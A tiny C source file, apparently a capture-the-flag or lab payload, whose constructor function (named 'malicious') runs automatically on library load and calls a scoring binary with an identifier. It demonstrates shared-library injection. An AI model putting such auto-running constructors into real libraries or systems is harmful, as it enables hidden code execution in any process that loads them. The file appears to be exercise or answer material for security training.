
#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 3c547bf9-82ea-4bc5-b330-0a0b5c2621c1");
}
